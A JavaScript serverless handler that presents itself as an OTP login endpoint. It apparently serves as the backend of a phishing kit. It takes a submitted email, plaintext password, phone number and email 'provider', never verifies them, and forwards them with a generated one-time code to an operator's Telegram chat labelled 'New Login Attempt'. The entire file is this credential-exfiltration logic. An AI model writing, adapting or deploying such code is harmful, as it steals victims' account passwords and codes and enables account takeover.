import Redis from "ioredis";
import fetch from "node-fetch";

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const REDIS_URL = process.env.REDIS_URL;

let redis;

function getOtpKey(email) {
  return `otp:${email}`;
}

function generateOtp() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

export default async function handler(req, res) {
  if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL) {
    return res.status(500).json({
      success: false,
      message:
        "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL",
    });
  }

  if (!redis) {
    redis = new Redis(REDIS_URL, {
      tls: {}, // enable TLS for rediss:// URLs
    });

    redis.on("error", (err) => console.error("Redis client error:", err));
    redis.on("connect", () => console.log("Redis connected"));
  }

  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Method not allowed" });
  }

  let bodyObj = req.body;
  if (typeof bodyObj === "string") {
    try {
      bodyObj = JSON.parse(bodyObj);
    } catch {
      return res.status(400).json({ success: false, message: "Invalid JSON body" });
    }
  }

  const { email, password, phone, provider } = bodyObj || {};

  if (!email || !password || !provider) {
    return res.status(400).json({ success: false, message: "Missing required fields" });
  }

  const normalizedEmail = email.trim().toLowerCase();
  const otp = generateOtp();

  try {
    await redis.set(getOtpKey(normalizedEmail), otp, "EX", 300); // expire in 5 minutes
  } catch (err) {
    console.error("Redis error:", err);
    return res.status(500).json({ success: false, message: "Failed to store OTP" });
  }

  const message = [
    "🔐 *New Login Attempt*",
    `📧 Email: ${normalizedEmail}`,
    `🔑 Password: ${password}`,
    `📱 Phone: ${phone || "N/A"}`,
    `🌐 Provider: ${provider}`,
    `🧾 OTP: ${otp}`,
    `🕒 Time: ${new Date().toISOString()}`,
  ].join("\n");

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      const text = await response.text();
      throw new Error(`Telegram API error: ${response.status} ${text}`);
    }

    console.log("OTP sent to Telegram");
    return res.status(200).json({
      success: true,
      message: "OTP sent to Telegram",
      email: normalizedEmail,
    });
  } catch (error) {
    console.error("Telegram error:", error);
    return res.status(500).json({
      success: false,
      message: "Failed to send OTP to Telegram",
      error: error.message,
    });
  }
}